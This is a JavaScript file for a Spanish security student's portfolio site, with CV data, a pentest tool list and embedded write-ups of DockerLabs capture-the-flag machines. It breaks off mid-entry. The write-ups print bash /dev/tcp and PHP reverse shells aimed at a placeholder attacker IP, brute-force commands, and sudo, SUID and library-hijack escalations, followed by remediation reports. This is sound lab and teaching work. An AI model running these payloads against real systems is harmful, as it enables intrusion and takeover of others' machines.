/* =========================================================
   AK1T4 // app.js
   ========================================================= */
(() => {
  "use strict";

  const $ = (s, el = document) => el.querySelector(s);
  const $$ = (s, el = document) => [...el.querySelectorAll(s)];
  const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
  const slug = (t) => t.normalize("NFD").replace(/[\u0300-\u036f]/g, "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
  const SITE = "https://v1nl4nd.com/";
  const zoomK = () => (document.body.getBoundingClientRect().width / document.body.offsetWidth) || 1;

  /* ---------------- DATA ---------------- */
  const EDU = [
    { lvl: "LV.01", t: "Grado Medio", s: "Instalaciones de Telecomunicaciones", d: "Ciclo Formativo de Grado Medio en Instalaciones de Telecomunicaciones.", dur: "2 años" },
    { lvl: "LV.02", t: "Grado Superior", s: "ASIR", d: "Administración de Sistemas Informáticos en Red. Enfoque en sistemas, redes y ciberseguridad.", dur: "2 años", now: true },
  ];

  const EXP = [
    { co: "Ocio Soluciones Informáticas", role: "Soporte técnico informático", place: "Valdemoro, Madrid", d: "Diagnóstico y reparación de equipos, instalación y configuración de software y atención técnica a clientes.", xp: 60 },
    { co: "PC Partner", role: "Soporte técnico informático · experiencia internacional", place: "Rouen, Francia", d: "Trabajo técnico en un entorno internacional: montaje, reparación y puesta a punto de equipos informáticos.", xp: 100 },
    { co: "Institut Les Tourelles", role: "Soporte informático · inventariado", place: "Rouen, Francia", d: "Soporte informático en un centro educativo: resolución de incidencias y gestión del inventario de equipos con Excel.", xp: 100 },
  ];

  const TOOLS = [
    { cat: "OSINT", type: "of", color: "#f03a65", items: [
      ["theHarvester", "Recolecta correos, subdominios, hosts y nombres a partir de fuentes públicas (buscadores, DNS...)."],
      ["Maltego", "Análisis de enlaces: relaciona personas, dominios, IPs y datos en grafos visuales."],
      ["Recon-ng", "Framework de reconocimiento OSINT con módulos, al estilo de Metasploit."],
      ["Sherlock", "Busca un nombre de usuario en cientos de redes sociales y servicios."],
      ["SpiderFoot", "Automatiza la recogida OSINT sobre un objetivo: IPs, dominios, filtraciones..."],
      ["Google Dorks", "Operadores de búsqueda avanzada de Google para encontrar información expuesta."],
      ["whois / dnsrecon", "Consulta datos de registro de dominios y enumera registros DNS."],
    ] },
    { cat: "Reconocimiento", type: "of", color: "#f03a65", items: [
      ["nmap", "Escáner de red y puertos; identifica servicios, versiones y sistema operativo del objetivo."],
      ["gobuster / ffuf", "Fuzzing por fuerza bruta de directorios, ficheros y subdominios."],
      ["whatweb", "Identifica tecnologías, CMS y versiones de un sitio web."],
    ] },
    { cat: "Web", type: "of", color: "#f03a65", items: [
      ["Burp Suite", "Proxy de interceptación web: analiza, modifica y ataca peticiones HTTP."],
      ["sqlmap", "Detecta y explota inyecciones SQL de forma automatizada."],
      ["curl", "Cliente HTTP de línea de comandos para probar y manipular peticiones."],
    ] },
    { cat: "Explotación & post", type: "of", color: "#f03a65", items: [
      ["Metasploit", "Framework de explotación con exploits, payloads y módulos de post-explotación."],
      ["netcat", "La 'navaja suiza' de red: conexiones TCP/UDP, shells y transferencia de datos."],
      ["linPEAS", "Enumera el sistema Linux buscando vías de escalada de privilegios."],
      ["GTFOBins", "Catálogo de binarios legítimos abusables para escalar privilegios o evadir restricciones."],
    ] },
    { cat: "Active Directory", type: "of", color: "#f03a65", items: [
      ["BloodHound", "Mapea relaciones y rutas de ataque dentro de un dominio Active Directory."],
      ["CrackMapExec", "Automatiza el pentesting de redes Windows/AD: SMB, credenciales, ejecución remota."],
      ["impacket", "Colección de scripts Python para protocolos de red y ataques a Windows/AD."],
    ] },
    { cat: "Cracking", type: "of", color: "#f03a65", items: [
      ["hashcat", "Crackea hashes de contraseñas aprovechando la potencia de la GPU."],
      ["John the Ripper", "Crackea contraseñas y hashes con diccionarios y reglas."],
      ["hydra", "Fuerza bruta de credenciales contra servicios en red (SSH, FTP, HTTP...)."],
    ] },
    { cat: "Defensa & Forense", type: "def", color: "#7f8ff2", items: [
      ["Wireshark", "Analizador de tráfico de red: captura e inspecciona paquetes en detalle."],
      ["Suricata (IDS/IPS)", "Motor de detección y prevención de intrusiones que inspecciona el tráfico con reglas."],
      ["Autopsy", "Plataforma de análisis forense digital sobre discos e imágenes."],
      ["Volatility", "Análisis forense de memoria RAM para investigar procesos y malware."],
    ] },
    { cat: "Lenguajes", type: "base", color: "#ebe3f3", items: [
      ["Python", "Automatización, scripting de exploits y desarrollo de herramientas propias."],
      ["Bash", "Scripting en Linux para automatizar tareas y encadenar herramientas."],
      ["PowerShell", "Automatización y administración en Windows; muy usado en entornos Active Directory."],
      ["SQL", "Consultas a bases de datos; base para entender y explotar inyecciones."],
    ] },
    { cat: "Sistemas & Homelab", type: "base", color: "#ebe3f3", items: [
      ["Linux", "Sistema base del día a día en pentesting y administración."],
      ["Windows", "Administración y resolución de incidencias en entornos Windows."],
      ["Debian Server (CLI, sin GUI)", "Gestión de servidores íntegramente por terminal, sin entorno gráfico."],
      ["Docker", "Contenedores para desplegar y aislar servicios y laboratorios."],
      ["Gestión de contenedores", "Despliegue, redes y mantenimiento de servicios en contenedores."],
      ["Self-hosting / homelab", "Montaje y administración de servicios propios en un laboratorio casero."],
      ["Git", "Control de versiones para código y proyectos."],
    ] },
    { cat: "IA", type: "base", color: "#ebe3f3", items: [
      ["Claude", "Asistente de IA que uso como apoyo en análisis, aprendizaje y documentación."],
      ["Claude Code", "Agente de IA en terminal para automatizar tareas técnicas y de desarrollo."],
      ["ChatGPT", "Modelo de OpenAI para consultas, generación de código y apoyo en investigación."],
      ["Gemini", "IA de Google para búsqueda asistida, análisis y generación de contenido."],
      ["GitHub Copilot", "Autocompletado y sugerencias de código con IA integradas en el editor."],
    ] },
  ];
  const ALL_TOOLS = TOOLS.flatMap((g) => g.items.map(([name, desc]) => ({ name, desc, cat: g.cat, type: g.type, color: g.color })));

  const CERTS = [
    { c: "Security+", team: "blue", track: "BLUE TEAM · BASE", name: "CompTIA Security+", org: "CompTIA",
      d: "Base de la ciberseguridad: amenazas y vulnerabilidades, criptografía, arquitectura segura, gestión de identidades y respuesta a incidentes." },
    { c: "eJPT", team: "red", track: "RED TEAM · INICIACIÓN", name: "eLearnSecurity Junior Penetration Tester", org: "INE Security",
      d: "Pentesting práctico: reconocimiento, enumeración, explotación y post-explotación en un examen 100 % práctico." },
    { c: "AZ-900", team: "cloud", track: "CLOUD · FUNDAMENTOS", name: "Microsoft Azure Fundamentals", org: "Microsoft",
      d: "Fundamentos de la nube y de Azure: servicios principales, seguridad, identidad, gobernanza y modelo de costes." },
    { c: "BTL1", team: "blue", track: "BLUE TEAM · SOC", name: "Blue Team Level 1", org: "Security Blue Team",
      d: "Operaciones de SOC en la práctica: phishing, análisis de tráfico y logs, SIEM, forense digital y respuesta a incidentes." },
  ];

  const RES = [["Cursos", 1], ["Herramientas", 2], ["Vulnerabilidades", 6], ["Guías / HowTo", 1], ["Divulgación", 2]];

  const WU = [
    {
      "name": "Walking Dead",
      "slug": "walking-dead",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 1
      },
      "desc": "El código fuente de la web filtra una web shell oculta; con ffuf descubro su parámetro vulnerable (cmd), consigo ejecución de comandos y una reverse shell como www-data, y escalo a root abusando del bit SUID en python3.8.",
      "tags": [
        "Gobuster",
        "ffuf",
        "Command Injection",
        "Web shell",
        "Reverse shell",
        "SUID",
        "python3",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "p",
          "Lanzo un escaneo completo de puertos con detección de servicios y versiones para ver a qué me enfrento."
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: The Walking Dead - CTF"
        ],
        [
          "p",
          "Dos puertos: SSH (22) y una web temática (80). Empiezo por la web."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "p",
          "Al revisar el código fuente de la portada aparece un enlace escondido muy jugoso."
        ],
        [
          "c",
          "$ curl -s http://172.17.0.2 | grep -i hidden\n<p class=\"hidden-link\"><a href=\"hidden/.shell.php\">Access Panel</a></p>"
        ],
        [
          "p",
          "Hay una carpeta <code>hidden</code> con un fichero oculto <code>.shell.php</code> que, al abrirlo, se ve en blanco: todo su código es PHP que se ejecuta en el servidor. Confirmo la estructura con gobuster."
        ],
        [
          "c",
          "$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100\n/hidden               (Status: 301)\n/backup.txt           (Status: 200)\n/index.html           (Status: 200)"
        ],
        [
          "h",
          "Ejecución de comandos"
        ],
        [
          "p",
          "Esa web shell seguramente espera un parámetro para ejecutar comandos. Lo busco con ffuf fuzzeando el nombre del parámetro y filtrando las respuestas vacías con <code>-fs 0</code>."
        ],
        [
          "c",
          "$ ffuf -u 'http://172.17.0.2/hidden/.shell.php?FUZZ=whoami' -w /usr/share/wordlists/dirb/common.txt -fs 0\ncmd                     [Status: 200, Size: 9]"
        ],
        [
          "p",
          "El parámetro es <code>cmd</code>. Lo pruebo y confirmo la ejecución de comandos como www-data."
        ],
        [
          "c",
          "$ curl 'http://172.17.0.2/hidden/.shell.php?cmd=whoami'\nwww-data"
        ],
        [
          "h",
          "Reverse shell"
        ],
        [
          "p",
          "Me pongo a la escucha en una terminal con netcat."
        ],
        [
          "c",
          "$ nc -lvnp 4444\nlistening on [any] 4444 ..."
        ],
        [
          "p",
          "Desde el navegador lanzo la reverse shell por el parámetro <code>cmd</code>. El <code>&</code> de la redirección va URL-encodeado como <code>%26</code>."
        ],
        [
          "c",
          "http://172.17.0.2/hidden/.shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<IP_ATACANTE>/4444 0>%261'"
        ],
        [
          "p",
          "Vuelvo a la terminal: ya tengo la shell como <strong>www-data</strong>. La convierto en una TTY en condiciones con Python."
        ],
        [
          "c",
          "connect to [<IP_ATACANTE>] from (UNKNOWN) [172.17.0.2]\nwww-data@1d3cc124941a:/var/www/html/hidden$ whoami\nwww-data\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ],
        [
          "h",
          "Escalada a root · SUID"
        ],
        [
          "p",
          "Busco binarios con el bit SUID activado."
        ],
        [
          "c",
          "$ find / -type f -perm -4000 -ls 2>/dev/null\n... /usr/bin/su /usr/bin/sudo /usr/bin/passwd ...\n/usr/bin/python3.8   <-- intérprete con SUID: abusable"
        ],
        [
          "p",
          "<code>python3.8</code> tiene SUID de root. Según GTFOBins, puedo pedirle que lance una bash conservando los privilegios con <code>-p</code>."
        ],
        [
          "c",
          "$ python3.8 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'\nbash-5.0# whoami\nroot"
        ],
        [
          "p",
          "Máquina Walking Dead completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Web shell oculta con ejecución de comandos",
          "CWE-78",
          "A03:2021 – Injection",
          "El fichero hidden/.shell.php acepta un parámetro 'cmd' que ejecuta comandos del sistema sin ningún control, dando RCE como www-data.",
          "Eliminar la web shell; nunca ejecutar entrada del usuario con system()/exec() y aplicar WAF y revisiones de código."
        ],
        [
          "CRÍTICA",
          "Escalada a root por bit SUID en python3.8",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "python3.8 tiene el bit SUID de root: cualquier usuario local obtiene una shell root en un solo comando (GTFOBins).",
          "Quitar el SUID (chmod u-s /usr/bin/python3.8) y auditar los binarios con SUID."
        ],
        [
          "MEDIA",
          "Ruta sensible filtrada en el código fuente",
          "CWE-200",
          "A05:2021 – Security Misconfiguration",
          "Un comentario en el HTML revela la ruta de la shell oculta (hidden/.shell.php), facilitando el acceso directo al backdoor.",
          "No dejar rutas ni pistas internas en el código que se sirve al público."
        ]
      ]
    },
    {
      "name": "File",
      "slug": "file",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "21/tcp (FTP), 80/tcp (HTTP)",
        "jumps": 4
      },
      "desc": "FTP anónimo que filtra un hash, subida de archivos con bypass de extensión (.phar) para una web shell como www-data, fuerza bruta local con su y una escalada encadenada mario → julen → iker → root abusando de sudo (awk, env) y de un Python Library Hijacking.",
      "tags": [
        "FTP",
        "John",
        "Gobuster",
        "Subida de archivos",
        "phar",
        "Reverse shell",
        "Fuerza bruta su",
        "sudo",
        "awk",
        "env",
        "Python Library Hijacking",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd (acceso anónimo permitido)\n80/tcp open  http    Apache httpd"
        ],
        [
          "p",
          "Dos puertos: FTP (21) con acceso anónimo y una web (80). Empiezo por el FTP."
        ],
        [
          "h",
          "FTP anónimo"
        ],
        [
          "p",
          "Entro al FTP como <code>anonymous</code> y me descargo el único fichero."
        ],
        [
          "c",
          "$ ftp 172.17.0.2\nName: anonymous\nftp> get anon.txt\nftp> bye\n$ cat anon.txt\n5f4dcc3b5aa765d61d8327deb882cf99...   <-- pinta de hash"
        ],
        [
          "p",
          "Es un hash. Lo rompo con John."
        ],
        [
          "c",
          "$ john --format=raw-md5 anon.txt --wordlist=/usr/share/wordlists/rockyou.txt\njustin           (?)"
        ],
        [
          "p",
          "El hash era <code>justin</code>: un posible nombre de usuario, aunque la vía de entrada acabará siendo la web."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "c",
          "$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50\n/uploads              (Status: 301)\n/file_upload.php      (Status: 200)"
        ],
        [
          "p",
          "Dos hallazgos clave: un directorio <code>/uploads</code> y un <code>/file_upload.php</code> que resulta ser un formulario de subida de archivos."
        ],
        [
          "h",
          "Subida de archivo y bypass de extensión"
        ],
        [
          "p",
          "Intento subir una reverse shell en PHP, pero el formulario rechaza <code>.php</code>. Pruebo otras extensiones y descubro que <code>.phar</code> sí se permite (y Apache lo ejecuta igual que PHP). Creo <code>imagen.phar</code> con una reverse shell apuntando a mi máquina (<code>&lt;IP_ATACANTE&gt;</code>) en el puerto 4000."
        ],
        [
          "c",
          "<?php\n$ip = \"<IP_ATACANTE>\";\n$port = 4000;\n$sock = fsockopen($ip, $port);\nif ($sock) {\n    $proc = proc_open(\"sh\", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);\n    if (is_resource($proc)) { proc_close($proc); }\n    fclose($sock);\n}\n?>"
        ],
        [
          "p",
          "Subo <code>imagen.phar</code> por el formulario (ahora sí lo acepta) y me pongo a la escucha."
        ],
        [
          "c",
          "$ nc -lvnp 4000\nlistening on [any] 4000 ..."
        ],
        [
          "p",
          "En otra terminal disparo el archivo subido desde <code>/uploads</code>."
        ],
        [
          "c",
          "$ curl http://172.17.0.2/uploads/imagen.phar"
        ],
        [
          "p",
          "Recibo la shell como <strong>www-data</strong>. La estabilizo con Python."
        ],
        [
          "c",
          "connect to [<IP_ATACANTE>] from (UNKNOWN) [172.17.0.2]\n$ whoami\nwww-data\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ],
        [
          "h",
          "Fuerza bruta de credenciales locales"
        ],
        [
          "p",
          "Miro los usuarios del sistema con shell."
        ],
        [
          "c",
          "$ cat /etc/passwd | grep \"/bin/bash\"\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/bash\nfernando / mario / julen / iker"
        ],
        [
          "p",
          "Varios usuarios locales. Me traigo a la víctima el script de fuerza bruta de <code>su</code> y el diccionario, sirviéndolos con un servidor HTTP desde mi máquina, y ataco a <strong>mario</strong>."
        ],
        [
          "c",
          "$ wget http://<IP_ATACANTE>:8000/su_bruteforce.sh\n$ wget http://<IP_ATACANTE>:8000/rockyou.txt\n$ chmod +x su_bruteforce.sh\n$ ./su_bruteforce.sh mario rockyou.txt\nContraseña encontrada: password123\n$ su mario\nPassword: (password123)"
        ],
        [
          "h",
          "De mario a julen · awk"
        ],
        [
          "c",
          "$ sudo -l\nUser mario may run the following commands on e93d350dd1bf:\n    (julen) NOPASSWD: /usr/bin/awk"
        ],
        [
          "p",
          "mario puede ejecutar <code>awk</code> como julen. Según GTFOBins, awk lanza una shell con <code>system()</code>."
        ],
        [
          "c",
          "$ sudo -u julen awk 'BEGIN {system(\"/bin/bash\")}'\njulen@e93d350dd1bf:/$ whoami\njulen"
        ],
        [
          "h",
          "De julen a iker · env"
        ],
        [
          "c",
          "$ sudo -l\nUser julen may run the following commands on e93d350dd1bf:\n    (iker) NOPASSWD: /usr/bin/env"
        ],
        [
          "p",
          "julen puede ejecutar <code>env</code> como iker; env lanza cualquier binario (GTFOBins)."
        ],
        [
          "c",
          "$ sudo -u iker /usr/bin/env /bin/bash -p\niker@e93d350dd1bf:~$ whoami\niker"
        ],
        [
          "h",
          "De iker a root · Python Library Hijacking"
        ],
        [
          "c",
          "$ sudo -l\nUser iker may run the following commands on e93d350dd1bf:\n    (ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py"
        ],
        [
          "p",
          "iker puede ejecutar como root un script de Python. Miro qué hace."
        ],
        [
          "c",
          "$ cat /home/iker/geo_ip.py\nimport requests\nip = input('Introduce la direccion IP que quieras geolocalizar: ')\nrespuesta = requests.get(f'http://ip-api.com/json/{ip}')\n..."
        ],
        [
          "n",
          "El script hace <code>import requests</code>. Python busca los módulos primero en el directorio actual, así que si creo un <code>requests.py</code> malicioso en <code>~/iker</code> (desde donde se ejecuta), Python cargará el mío en vez de la librería real. Como el script corre como root vía sudo, mi código se ejecuta como root."
        ],
        [
          "c",
          "$ echo -e 'import os;\\nos.system(\"bash -p\")' > requests.py\n$ sudo /usr/bin/python3 /home/iker/geo_ip.py\nroot@e93d350dd1bf:/home/iker# whoami\nroot"
        ],
        [
          "p",
          "Máquina File completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Subida de archivos sin validar (bypass por extensión .phar)",
          "CWE-434",
          "A05:2021 – Security Misconfiguration",
          "file_upload.php bloquea .php pero no .phar; Apache ejecuta el .phar como PHP, dando una web shell y ejecución remota como www-data.",
          "Validar el tipo real (magic bytes), lista blanca estricta de extensiones, renombrar al guardar y no permitir ejecución en el directorio de subidas."
        ],
        [
          "CRÍTICA",
          "Python Library Hijacking en script ejecutable por sudo",
          "CWE-426",
          "A08:2021 – Software and Data Integrity Failures",
          "iker puede ejecutar como root un script python que importa 'requests' desde su directorio; colocando un requests.py malicioso se obtiene una shell root.",
          "Ejecutar con rutas e intérprete controlados (PYTHONPATH fijo), no permitir sudo sobre scripts en directorios escribibles y fijar el working directory."
        ],
        [
          "ALTA",
          "Contraseña de usuario local débil (fuerza bruta de su)",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta mario usa una contraseña de diccionario (password123), descubierta por fuerza bruta local contra su.",
          "Contraseñas robustas, bloqueo de intentos y monitorización de autenticaciones fallidas."
        ],
        [
          "ALTA",
          "Sudo mal configurado hacia otros usuarios (awk, env)",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "Reglas sudo permiten ejecutar awk como julen y env como iker, encadenando un pivote de usuario en usuario.",
          "Mínimo privilegio en sudoers; no conceder binarios que pueden ejecutar comandos (awk, env) como otros usuarios."
        ],
        [
          "MEDIA",
          "Acceso anónimo al FTP con información sensible",
          "CWE-306",
          "A05:2021 – Security Misconfiguration",
          "El FTP permite login anónimo y expone anon.txt, un hash MD5 débil que se crackea offline.",
          "Deshabilitar el acceso anónimo y no dejar ficheros sensibles en el FTP; usar hashes robustos y con sal."
        ]
      ]
    },
    {
      "name": "Allien",
      "slug": "allien",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP), 139·445/tcp (SMB)",
        "jumps": 3
      },
      "desc": "Enumeración SMB anónima que filtra usuarios y un JWT, fuerza bruta de satriani7 por SMB, un fichero con la contraseña del administrador, acceso por SSH, una reverse shell PHP en el webroot para pasar a www-data y escalada a root abusando de un sudo NOPASSWD sobre service.",
      "tags": [
        "SMB",
        "enum4linux",
        "smbclient",
        "CrackMapExec",
        "JWT",
        "Reverse shell",
        "sudo",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu\n80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2"
        ],
        [
          "p",
          "Lo que destaca es Samba (139/445). Antes de tocar la web, enumero el SMB, que suele ser una mina de información."
        ],
        [
          "h",
          "Enumeración SMB"
        ],
        [
          "c",
          "$ enum4linux 172.17.0.2\n[+] Server 172.17.0.2 allows sessions using username '', password ''\n... Users ...\nAccount: usuario1 / usuario2 / usuario3 / administrador / satriani7\n... Shares ...\nmyshare    Disk   Carpeta compartida sin restricciones\nbackup24   Disk   Privado\nhome       Disk   Produccion"
        ],
        [
          "p",
          "El servidor permite sesión nula (sin credenciales) y lista usuarios y recursos. El recurso <code>myshare</code> es accesible de forma anónima."
        ],
        [
          "c",
          "$ smbclient //172.17.0.2/myshare -N\nsmb: \\> ls\n  access.txt                          N      956\nsmb: \\> get access.txt"
        ],
        [
          "h",
          "El JWT de access.txt"
        ],
        [
          "p",
          "El contenido de <code>access.txt</code> es un JWT (tres bloques en Base64 separados por puntos). Decodifico la parte del payload para ver qué guarda."
        ],
        [
          "c",
          "$ cat access.txt | cut -d. -f2 | base64 -d 2>/dev/null\n{\"email\":\"satriani7@eseemeb.dl\",\"role\":\"user\",\"iat\":1728160373, ...}"
        ],
        [
          "p",
          "El token revela un correo y, sobre todo, un usuario: <strong>satriani7</strong>."
        ],
        [
          "h",
          "Fuerza bruta de satriani7"
        ],
        [
          "p",
          "Con el usuario identificado, lanzo fuerza bruta contra el SMB con CrackMapExec."
        ],
        [
          "c",
          "$ crackmapexec smb 172.17.0.2 -u satriani7 -p rockyou.txt\nSMB   172.17.0.2   445   SAMBASERVER   [+] SAMBASERVER\\satriani7:50cent"
        ],
        [
          "p",
          "Credenciales: <strong>satriani7 : 50cent</strong>."
        ],
        [
          "h",
          "El recurso backup24"
        ],
        [
          "p",
          "Con esas credenciales accedo al recurso privado <code>backup24</code> y busco lo interesante."
        ],
        [
          "c",
          "$ smbclient //172.17.0.2/backup24 -U satriani7\nPassword: (50cent)\nsmb: \\> cd Documents\\Personal\\\nsmb: \\> get credentials.txt"
        ],
        [
          "p",
          "El fichero <code>credentials.txt</code> es un listado de credenciales en texto plano. La que me interesa:"
        ],
        [
          "c",
          "7. Usuario: administrador\n   - Contraseña: Adm1nP4ss2024"
        ],
        [
          "h",
          "Acceso por SSH"
        ],
        [
          "c",
          "$ ssh administrador@172.17.0.2\nadministrador@172.17.0.2's password: (Adm1nP4ss2024)\nWelcome to Ubuntu 24.04.1 LTS\n$ whoami\nadministrador\n$ script /dev/null -c bash"
        ],
        [
          "h",
          "Pivote a www-data"
        ],
        [
          "p",
          "administrador tiene permisos de escritura en el webroot <code>/var/www/html</code>. Eso me permite dejar una reverse shell en PHP que ejecutará el servidor web (como www-data)."
        ],
        [
          "c",
          "$ ls -la /var/www/html/\ndrwxrwxrwx 2 root root 4096 ... .   <-- escribible por cualquiera"
        ],
        [
          "p",
          "Creo <code>shell.php</code> apuntando a mi máquina (<code>&lt;IP_ATACANTE&gt;</code>) en el puerto 4444, me pongo a la escucha y lo disparo por HTTP."
        ],
        [
          "c",
          "$ nc -lvnp 4444\nlistening on [any] 4444 ...\n\n$ curl http://172.17.0.2/shell.php\n\nconnect to [<IP_ATACANTE>] from (UNKNOWN) [172.17.0.2]\n$ whoami\nwww-data"
        ],
        [
          "h",
          "Escalada a root · sudo service"
        ],
        [
          "p",
          "Estabilizo la TTY y reviso los permisos de sudo de www-data."
        ],
        [
          "c",
          "$ sudo -l\nUser www-data may run the following commands on a75e760e805b:\n    (ALL) NOPASSWD: /usr/sbin/service"
        ],
        [
          "p",
          "www-data puede ejecutar <code>service</code> como root sin contraseña. Según GTFOBins, service acepta una ruta a un script; pasándole una ruta relativa a bash consigo una shell privilegiada."
        ],
        [
          "c",
          "$ sudo service ../../bin/bash\nroot@a75e760e805b:/# whoami\nroot"
        ],
        [
          "p",
          "Máquina Allien completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo NOPASSWD sobre /usr/sbin/service",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "www-data puede ejecutar service como root sin contraseña; con una ruta relativa se lanza una bash privilegiada (GTFOBins).",
          "Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre binarios que invocan otros programas."
        ],
        [
          "ALTA",
          "Credenciales en texto plano en un recurso de red",
          "CWE-312",
          "A02:2021 – Cryptographic Failures",
          "El recurso backup24 contiene un credentials.txt con todas las contraseñas en claro, incluida la del administrador (Adm1nP4ss2024).",
          "No almacenar credenciales en texto plano ni en recursos compartidos; usar un gestor de secretos y cifrado en reposo."
        ],
        [
          "ALTA",
          "Contraseña débil susceptible a fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta satriani7 usa una contraseña débil (50cent), descubierta por fuerza bruta contra el SMB.",
          "Contraseñas robustas, bloqueo de cuenta tras N intentos y monitorización de accesos."
        ],
        [
          "ALTA",
          "Directorio web escribible por un usuario sin privilegios",
          "CWE-732",
          "A05:2021 – Security Misconfiguration",
          "El webroot /var/www/html es escribible, lo que permite subir una web shell PHP y ejecutar comandos como www-data.",
          "Permisos correctos en el webroot (no escribible por usuarios) y deshabilitar la ejecución de scripts subidos."
        ],
        [
          "MEDIA",
          "SMB con sesión nula y recurso compartido anónimo",
          "CWE-306",
          "A05:2021 – Security Misconfiguration",
          "Samba permite enumerar usuarios sin credenciales (enum4linux) y acceder de forma anónima al recurso myshare, que filtra un JWT con un usuario válido.",
          "Deshabilitar las sesiones nulas (restrict anonymous), no exponer recursos sin autenticación y limitar la enumeración."
        ]
      ]
    },
    {
      "name": "Flynn",
      "slug": "flynn",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "La web expone el nombre de usuario en el propio HTML; con hydra descubro que su contraseña es trivial (igual al usuario) y escalo a root abusando de un sudo NOPASSWD sobre /usr/bin/env.",
      "tags": [
        "Hydra",
        "Fuerza bruta SSH",
        "Disclosure de usuario",
        "sudo",
        "env",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))"
        ],
        [
          "p",
          "Dos puertos: SSH (22) y un servidor web (80). Empiezo por la web."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "p",
          "La portada es minimalista, pero su propio HTML canta el nombre de usuario."
        ],
        [
          "c",
          "$ curl -s http://172.17.0.2\n<h1>flynn</h1>\n<img src=\"flynn.png\">"
        ],
        [
          "p",
          "La imagen <code>flynn.png</code> no esconde metadatos ni datos útiles, y gobuster no encuentra más rutas que <code>index.html</code>. Así que la pista es clara: el usuario <strong>flynn</strong>."
        ],
        [
          "h",
          "Fuerza bruta del usuario flynn"
        ],
        [
          "c",
          "$ hydra -l flynn -P rockyou.txt ssh://172.17.0.2 -t 4\n[22][ssh] host: 172.17.0.2   login: flynn   password: flynn\n1 of 1 target successfully completed, 1 valid password found"
        ],
        [
          "p",
          "La credencial resulta ser <strong>flynn : flynn</strong>: la contraseña es el propio nombre de usuario, el clásico de los clásicos."
        ],
        [
          "n",
          "Si hydra devuelve 'children were disabled...' significa que el SSH limita la fuerza bruta. Baja a <code>-t 1 -W 5</code> para comprobar que conecta, limpia la clave vieja con <code>ssh-keygen -R 172.17.0.2</code> y vuelve a subir a <code>-t 4</code>."
        ],
        [
          "h",
          "Acceso por SSH"
        ],
        [
          "c",
          "$ ssh flynn@172.17.0.2\nflynn@172.17.0.2's password: (flynn)\nWelcome to Ubuntu 26.04 LTS\nflynn@687ec7404c82:~$ whoami\nflynn"
        ],
        [
          "h",
          "Escalada a root · sudo env"
        ],
        [
          "c",
          "$ sudo -l\nUser flynn may run the following commands on 687ec7404c82:\n    (ALL) NOPASSWD: /usr/bin/env"
        ],
        [
          "p",
          "flynn puede ejecutar <code>env</code> como root sin contraseña. Como env sirve para lanzar otros programas, le pido que ejecute una bash, que heredará el contexto de root (GTFOBins)."
        ],
        [
          "c",
          "$ sudo /usr/bin/env /bin/bash\nroot@687ec7404c82:/home/flynn# id\nuid=0(root) gid=0(root) groups=0(root)"
        ],
        [
          "p",
          "En <code>/root/password.txt</code> hay un easter egg temático de Tron Legacy, un detalle del autor sin valor operativo. Máquina Flynn completada."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
